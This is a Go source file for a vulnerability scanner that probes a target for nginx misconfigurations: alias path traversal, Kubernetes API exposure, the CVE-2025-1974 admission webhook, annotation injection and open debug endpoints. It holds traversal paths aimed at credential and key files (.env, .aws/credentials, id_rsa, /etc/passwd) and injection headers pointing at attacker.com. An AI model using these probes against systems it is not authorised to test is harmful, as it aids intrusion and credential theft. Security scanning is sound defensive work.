package proxy

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

// NginxVulnResult contains results from nginx-specific vulnerability checks
type NginxVulnResult struct {
	OffBySlashVuln         bool     `json:"off_by_slash_vulnerable"`
	OffBySlashPaths        []string `json:"off_by_slash_paths,omitempty"`
	K8sAPIExposed          bool     `json:"k8s_api_exposed"`
	K8sAPIEndpoints        []string `json:"k8s_api_endpoints,omitempty"`
	IngressWebhookExposed  bool     `json:"ingress_webhook_exposed"`
	IngressWebhookCVE      string   `json:"ingress_webhook_cve,omitempty"`
	DebugEndpointsExposed  bool     `json:"debug_endpoints_exposed"`
	DebugEndpoints         []string `json:"debug_endpoints,omitempty"`
	VulnerableAnnotations  bool     `json:"vulnerable_annotations"`
	AnnotationInjections   []string `json:"annotation_injections,omitempty"`
}

// testNginxOffBySlash tests for Nginx alias directive path traversal
func (c *Checker) testNginxOffBySlash(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[NGINX OFF-BY-SLASH] Testing for alias path traversal vulnerability\n"
	}

	vulnerablePaths := []string{}
	testPaths := []string{
		"/static../.git/config",
		"/api../.env",
		"/assets../composer.json",
		"/images../package.json",
		"/js../web.config",
		"/css../phpinfo.php",
		"/media../../../etc/passwd",
		"/lib../.aws/credentials",
		"/content../backup.sql",
		"/files../id_rsa",
	}

	for _, path := range testPaths {
		req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for indicators of successful path traversal
		if resp.StatusCode == 200 {
			// Check for git config indicators
			if strings.Contains(bodyStr, "[core]") || strings.Contains(bodyStr, "repositoryformatversion") {
				vulnerablePaths = append(vulnerablePaths, path+" (git config exposed)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Found git config at: %s\n", path)
				}
			}

			// Check for .env file indicators
			if strings.Contains(bodyStr, "db_password") || strings.Contains(bodyStr, "api_key") ||
				strings.Contains(bodyStr, "secret_key") || strings.Contains(bodyStr, "app_key") {
				vulnerablePaths = append(vulnerablePaths, path+" (.env file exposed)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Found .env file at: %s\n", path)
				}
			}

			// Check for passwd file indicators
			if strings.Contains(bodyStr, "root:x:0:0") || strings.Contains(bodyStr, "/bin/bash") {
				vulnerablePaths = append(vulnerablePaths, path+" (passwd file exposed)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Found passwd file at: %s\n", path)
				}
			}

			// Check for package.json indicators
			if strings.Contains(bodyStr, "\"name\":") && strings.Contains(bodyStr, "\"version\":") {
				vulnerablePaths = append(vulnerablePaths, path+" (package.json exposed)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Found package.json at: %s\n", path)
				}
			}

			// Check for composer.json indicators
			if strings.Contains(bodyStr, "\"require\":") || strings.Contains(bodyStr, "\"autoload\":") {
				vulnerablePaths = append(vulnerablePaths, path+" (composer.json exposed)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Found composer.json at: %s\n", path)
				}
			}
		}
	}

	return len(vulnerablePaths) > 0, vulnerablePaths
}

// testK8sAPIExposure tests for Kubernetes API exposure via header manipulation
func (c *Checker) testK8sAPIExposure(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[K8S API EXPOSURE] Testing for Kubernetes API exposure\n"
	}

	exposedEndpoints := []string{}

	// Test cases for K8s API exposure
	tests := []struct {
		path    string
		headers map[string]string
		desc    string
	}{
		{
			path: "/api/v1/namespaces",
			headers: map[string]string{
				"X-Original-URL": "/api/v1/namespaces",
				"X-Rewrite-URL":  "/api/v1/namespaces",
			},
			desc: "namespace enumeration",
		},
		{
			path: "/api/v1/pods",
			headers: map[string]string{
				"X-Original-URL": "/api/v1/pods",
			},
			desc: "pod listing",
		},
		{
			path: "/debug/pprof/",
			headers: map[string]string{
				"X-Original-URL": "/debug/pprof/",
			},
			desc: "debug endpoint",
		},
		{
			path: "/api/v1/namespaces/default/pods",
			headers: map[string]string{
				"X-Original-URL": "/api/v1/namespaces/default/pods",
			},
			desc: "default namespace pods",
		},
		{
			path: "/api/v1/nodes",
			headers: map[string]string{
				"X-Original-URL": "/api/v1/nodes",
			},
			desc: "node listing",
		},
	}

	for _, test := range tests {
		req, err := http.NewRequest("GET", c.config.ValidationURL+test.path, nil)
		if err != nil {
			continue
		}

		// Set headers
		for key, value := range test.headers {
			req.Header.Set(key, value)
		}
		req.Header.Set("User-Agent", c.config.UserAgent)
		req.Header.Set("Accept", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check for K8s API response indicators
		if resp.StatusCode == 200 {
			if strings.Contains(bodyStr, "\"kind\":") &&
				(strings.Contains(bodyStr, "\"apiVersion\":") || strings.Contains(bodyStr, "PodList") ||
					strings.Contains(bodyStr, "NamespaceList") || strings.Contains(bodyStr, "NodeList")) {
				exposedEndpoints = append(exposedEndpoints, fmt.Sprintf("%s (%s)", test.path, test.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] K8s API exposed: %s (%s)\n", test.path, test.desc)
				}
			}
		}
	}

	return len(exposedEndpoints) > 0, exposedEndpoints
}

// testIngressWebhookCVE2025_1974 tests for CVE-2025-1974 nginx ingress admission controller RCE
func (c *Checker) testIngressWebhookCVE2025_1974(client *http.Client, result *ProxyResult) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2025-1974] Testing for Nginx Ingress admission controller RCE\n"
	}

	// Test if the admission webhook endpoint is accessible
	webhookPaths := []string{
		"/validate",
		"/ingress-nginx-controller-admission/validate",
		"/apis/admission.k8s.io/v1/validate",
	}

	for _, path := range webhookPaths {
		req, err := http.NewRequest("POST", c.config.ValidationURL+path, strings.NewReader("{}"))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for webhook response indicators
		if resp.StatusCode == 200 || resp.StatusCode == 400 {
			// Look for admission review responses or engine_by_id errors
			if strings.Contains(bodyStr, "admission") || strings.Contains(bodyStr, "validated") ||
				strings.Contains(bodyStr, "engine_by_id") || strings.Contains(bodyStr, "dso support") {
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] Admission webhook accessible at: %s (CVE-2025-1974)\n", path)
				}
				return true
			}
		}
	}

	return false
}

// testNginxConfigInjection tests for configuration injection via annotations (CVE-2025 series)
func (c *Checker) testNginxConfigInjection(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[NGINX CONFIG INJECTION] Testing for annotation-based config injection\n"
	}

	injections := []string{}

	// Test headers that might reveal annotation injection vulnerabilities
	testHeaders := map[string]string{
		"X-Auth-Request-Redirect":   "http://attacker.com/evil",
		"X-Auth-URL":                "http://attacker.com/evil",
		"X-Mirror-URL":              "http://attacker.com/mirror",
		"X-Configuration-Snippet":   "return 200 'injected';",
		"X-Server-Snippet":          "return 200 'injected';",
	}

	for headerName, headerValue := range testHeaders {
		req, err := http.NewRequest("GET", c.config.ValidationURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set(headerName, headerValue)
		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check if the header affected the response (potential injection point)
		if resp.StatusCode == 200 && strings.Contains(string(body), "injected") {
			injections = append(injections, fmt.Sprintf("%s header injectable", headerName))
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] Config injection via %s\n", headerName)
			}
		}

		// Check for auth-url redirect behavior (CVE-2025-24514)
		if headerName == "X-Auth-URL" && (resp.StatusCode == 302 || resp.StatusCode == 301) {
			location := resp.Header.Get("Location")
			if strings.Contains(location, "attacker.com") {
				injections = append(injections, "auth-url redirect injection (CVE-2025-24514)")
				if c.debug {
					result.DebugInfo += "  [VULN] auth-url redirect to external host\n"
				}
			}
		}
	}

	return len(injections) > 0, injections
}

// testNginxDebugEndpoints tests for exposed debug/profiling endpoints
func (c *Checker) testNginxDebugEndpoints(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[DEBUG ENDPOINTS] Testing for exposed debug/profiling endpoints\n"
	}

	exposedEndpoints := []string{}
	debugPaths := []string{
		"/debug/pprof/",
		"/debug/pprof/heap",
		"/debug/pprof/goroutine",
		"/debug/pprof/block",
		"/debug/pprof/threadcreate",
		"/debug/pprof/cmdline",
		"/debug/pprof/profile",
		"/debug/pprof/symbol",
		"/debug/pprof/trace",
		"/metrics",
		"/healthz",
		"/livez",
		"/readyz",
		"/_status",
		"/server-status",
		"/nginx_status",
	}

	for _, path := range debugPaths {
		req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		if resp.StatusCode == 200 {
			// Check for pprof indicators
			if strings.Contains(bodyStr, "pprof") || strings.Contains(bodyStr, "heap profile") ||
				strings.Contains(bodyStr, "goroutine") {
				exposedEndpoints = append(exposedEndpoints, path+" (pprof profiling)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Debug endpoint exposed: %s\n", path)
				}
			}

			// Check for metrics indicators
			if strings.Contains(bodyStr, "# help") || strings.Contains(bodyStr, "# type") ||
				strings.Contains(path, "metrics") {
				exposedEndpoints = append(exposedEndpoints, path+" (metrics)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [INFO] Metrics endpoint: %s\n", path)
				}
			}

			// Check for status page indicators
			if strings.Contains(bodyStr, "active connections") || strings.Contains(bodyStr, "nginx version") {
				exposedEndpoints = append(exposedEndpoints, path+" (status page)")
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [INFO] Status page: %s\n", path)
				}
			}
		}
	}

	return len(exposedEndpoints) > 0, exposedEndpoints
}

// performNginxVulnerabilityChecks runs all nginx-specific vulnerability checks
func (c *Checker) performNginxVulnerabilityChecks(client *http.Client, result *ProxyResult) *NginxVulnResult {
	nginxResult := &NginxVulnResult{}

	// Test off-by-slash vulnerability
	nginxResult.OffBySlashVuln, nginxResult.OffBySlashPaths = c.testNginxOffBySlash(client, result)

	// Test K8s API exposure
	nginxResult.K8sAPIExposed, nginxResult.K8sAPIEndpoints = c.testK8sAPIExposure(client, result)

	// Test ingress webhook CVE-2025-1974
	nginxResult.IngressWebhookExposed = c.testIngressWebhookCVE2025_1974(client, result)
	if nginxResult.IngressWebhookExposed {
		nginxResult.IngressWebhookCVE = "CVE-2025-1974"
	}

	// Test config injection
	nginxResult.VulnerableAnnotations, nginxResult.AnnotationInjections = c.testNginxConfigInjection(client, result)

	// Test debug endpoints
	nginxResult.DebugEndpointsExposed, nginxResult.DebugEndpoints = c.testNginxDebugEndpoints(client, result)

	return nginxResult
}
